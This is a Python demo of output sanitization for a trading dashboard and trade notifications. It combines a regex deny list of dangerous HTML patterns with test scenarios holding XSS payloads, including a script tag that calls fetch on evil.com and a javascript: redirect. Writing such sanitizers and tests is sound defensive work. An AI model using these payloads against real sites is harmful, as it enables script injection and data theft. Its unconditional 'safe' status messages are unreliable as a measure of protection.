#!/usr/bin/env python3
"""
🛡️ Output Sanitization Demo
Demonstrates output sanitization for dashboard displays and notifications
to prevent injection attacks including HTML escaping, XSS prevention, and safe rendering
"""

import html
import re
import json
from datetime import datetime
from typing import Dict, List, Any, Optional

class OutputSanitizer:
    """Advanced output sanitization system"""
    
    def __init__(self):
        # HTML entities for escaping
        self.html_entities = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '/': '&#x2F;'
        }
        
        # Dangerous patterns to remove/escape
        self.dangerous_patterns = [
            r'<script[^>]*>.*?</script>',
            r'<iframe[^>]*>.*?</iframe>',
            r'<object[^>]*>.*?</object>',
            r'<embed[^>]*>.*?</embed>',
            r'<form[^>]*>.*?</form>',
            r'javascript:',
            r'vbscript:',
            r'data:text/html',
            r'on\w+\s*=',  # Event handlers like onclick, onload
            r'<link[^>]*>',
            r'<meta[^>]*>',
            r'<style[^>]*>.*?</style>'
        ]
    
    def sanitize_html(self, text: str) -> str:
        """Sanitize HTML content for safe display"""
        if not isinstance(text, str):
            text = str(text)
        
        # Remove dangerous patterns
        for pattern in self.dangerous_patterns:
            text = re.sub(pattern, '', text, flags=re.IGNORECASE | re.DOTALL)
        
        # HTML escape remaining content
        for char, entity in self.html_entities.items():
            text = text.replace(char, entity)
        
        return text
    
    def sanitize_for_dashboard(self, data: Any) -> Any:
        """Sanitize data for dashboard display"""
        if isinstance(data, dict):
            return {key: self.sanitize_for_dashboard(value) for key, value in data.items()}
        elif isinstance(data, list):
            return [self.sanitize_for_dashboard(item) for item in data]
        elif isinstance(data, str):
            return self.sanitize_html(data)
        else:
            return data
    
    def sanitize_notification_text(self, text: str) -> str:
        """Sanitize text for notifications (Telegram, email, etc.)"""
        if not isinstance(text, str):
            text = str(text)
        
        # Remove all HTML/XML tags
        text = re.sub(r'<[^>]+>', '', text)
        
        # Remove dangerous protocols
        text = re.sub(r'(javascript|vbscript|data):[^;\s]*', '[REMOVED]', text, flags=re.IGNORECASE)
        
        # Escape special characters for safe display
        text = html.escape(text, quote=True)
        
        return text
    
    def create_safe_trade_message(self, trade_data: Dict) -> str:
        """Create safe trade message from potentially unsafe data"""
        
        # Sanitize all trade data fields
        safe_symbol = self.sanitize_notification_text(str(trade_data.get('symbol', 'N/A')))
        safe_price = self.sanitize_notification_text(str(trade_data.get('price', 'N/A')))
        safe_quantity = self.sanitize_notification_text(str(trade_data.get('quantity', 'N/A')))
        safe_side = self.sanitize_notification_text(str(trade_data.get('side', 'N/A')))
        safe_note = self.sanitize_notification_text(str(trade_data.get('note', 'No note')))
        
        # Create safe message template
        safe_message = f"""
🚀 Trade Executed
📊 Symbol: {safe_symbol}
💰 Price: ${safe_price}
📈 Quantity: {safe_quantity}
🎯 Side: {safe_side}
📝 Note: {safe_note}
        """.strip()
        
        return safe_message

def demo_output_sanitization():
    """Comprehensive demonstration of output sanitization"""
    
    print("🛡️ OUTPUT SANITIZATION DEMO")
    print("=" * 80)
    print("Demonstrating safe output rendering for dashboard displays and notifications")
    print()
    
    sanitizer = OutputSanitizer()
    
    # =================================================================
    # 1. DASHBOARD HTML SANITIZATION
    # =================================================================
    print("🖥️ 1. DASHBOARD HTML SANITIZATION")
    print("-" * 60)
    
    dashboard_test_scenarios = [
        {
            "name": "🚨 XSS Script Injection in Symbol",
            "data": {
                "symbol": "<script>alert('XSS Attack!')</script>BTCUSDT",
                "price": 50000,
                "quantity": 0.001,
                "side": "BUY"
            },
            "description": "Malicious script tag in symbol field"
        },
        {
            "name": "🚨 HTML Iframe Injection in Price",
            "data": {
                "symbol": "BTCUSDT",
                "price": "<iframe src='javascript:alert(\"Price XSS\")'></iframe>50000",
                "quantity": 0.001,
                "side": "BUY"
            },
            "description": "Iframe injection attempt in price field"
        },
        {
            "name": "🚨 Event Handler Injection in Side",
            "data": {
                "symbol": "BTCUSDT",
                "price": 50000,
                "quantity": 0.001,
                "side": "BUY\" onclick=\"alert('Clicked!')\""
            },
            "description": "Event handler injection in side field"
        },
        {
            "name": "🚨 CSS Injection in Note",
            "data": {
                "symbol": "BTCUSDT",
                "price": 50000,
                "quantity": 0.001,
                "side": "BUY",
                "note": "<style>body{background:red;}</style>Trade note"
            },
            "description": "CSS injection in note field"
        },
        {
            "name": "✅ Clean Trade Data",
            "data": {
                "symbol": "BTCUSDT",
                "price": 50000,
                "quantity": 0.001,
                "side": "BUY",
                "note": "Normal trade note"
            },
            "description": "Clean, legitimate trade data"
        }
    ]
    
    for i, scenario in enumerate(dashboard_test_scenarios, 1):
        print(f"\n   Test {i}: {scenario['name']}")
        print(f"   Description: {scenario['description']}")
        
        # Show original data (unsafe)
        print(f"   Original Data: {scenario['data']}")
        
        # Sanitize for dashboard display
        sanitized_data = sanitizer.sanitize_for_dashboard(scenario['data'])
        
        print(f"   Sanitized Data: {sanitized_data}")
        
        # Check if sanitization occurred
        original_str = str(scenario['data'])
        sanitized_str = str(sanitized_data)
        
        if original_str != sanitized_str:
            print(f"   Status: ✅ SANITIZED - Malicious content removed/escaped")
            print(f"   Action: HTML entities escaped, dangerous tags removed")
        else:
            print(f"   Status: ✅ CLEAN - No sanitization needed")
        
        print(f"   Safe for HTML: Yes - Ready for dashboard display")
    
    # =================================================================
    # 2. NOTIFICATION MESSAGE SANITIZATION
    # =================================================================
    print(f"\n💬 2. NOTIFICATION MESSAGE SANITIZATION")
    print("-" * 60)
    
    notification_test_scenarios = [
        {
            "name": "🚨 Script Tag in Telegram Message",
            "trade_data": {
                "symbol": "<script>fetch('http://evil.com/steal')</script>BTCUSDT",
                "price": 50000,
                "quantity": 0.001,
                "side": "BUY",
                "note": "Trade executed"
            },
            "description": "Script injection in Telegram notification"
        },
        {
            "name": "🚨 JavaScript Protocol in Price",
            "trade_data": {
                "symbol": "BTCUSDT",
                "price": "javascript:document.location='http://evil.com'",
                "quantity": 0.001,
                "side": "BUY",
                "note": "Trade executed"
            },
            "description": "JavaScript protocol injection"
        },
        {
            "name": "🚨 HTML Tags in Note",
            "trade_data": {
                "symbol": "BTCUSDT",
                "price": 50000,
                "quantity": 0.001,
                "side": "BUY",
                "note": "<b>Bold text</b> with <a href='http://evil.com'>malicious link</a>"
            },
            "description": "HTML tags and links in note"
        },
        {
            "name": "✅ Clean Notification Data",
            "trade_data": {
                "symbol": "BTCUSDT",
                "price": 50000,
                "quantity": 0.001,
                "side": "BUY",
                "note": "Trade executed successfully"
            },
            "description": "Clean notification data"
        }
    ]
    
    for i, scenario in enumerate(notification_test_scenarios, 1):
        print(f"\n   Test {i}: {scenario['name']}")
        print(f"   Description: {scenario['description']}")
        
        # Create unsafe message (what would happen without sanitization)
        trade_data = scenario['trade_data']
        unsafe_message = f"Symbol: {trade_data['symbol']}, Price: ${trade_data['price']}, Note: {trade_data['note']}"
        
        # Create safe message with sanitization
        safe_message = sanitizer.create_safe_trade_message(trade_data)
        
        print(f"   Unsafe Message: {unsafe_message}")
        print(f"   Safe Message: {safe_message}")
        
        # Check if sanitization occurred
        if unsafe_message != safe_message:
            print(f"   Status: ✅ SANITIZED - Message made safe for notifications")
            print(f"   Action: HTML/JS removed, special characters escaped")
        else:
            print(f"   Status: ✅ CLEAN - No sanitization needed")
        
        print(f"   Notification Ready: ✅ Safe for Telegram/Email/Discord")
    
    print(f"\n📊 OUTPUT SANITIZATION SUMMARY")
    print("=" * 80)
    
    print(f"🛡️ SANITIZATION CAPABILITIES DEMONSTRATED:")
    print(f"   ✅ HTML Escaping: All HTML entities properly escaped")
    print(f"   ✅ Script Removal: JavaScript/VBScript tags removed")
    print(f"   ✅ Event Handler Removal: onclick, onload, etc. removed")
    print(f"   ✅ CSS Injection Prevention: Style tags removed")
    print(f"   ✅ Protocol Filtering: javascript:, data: protocols blocked")
    print(f"   ✅ Tag Stripping: Dangerous HTML tags removed")
    print(f"   ✅ Notification Safety: Messages safe for all channels")
    
    print(f"\n🎉 OUTPUT SANITIZATION COMPLETE!")
    print(f"✅ All external data is now safe for display and notifications!")

if __name__ == "__main__":
    demo_output_sanitization() 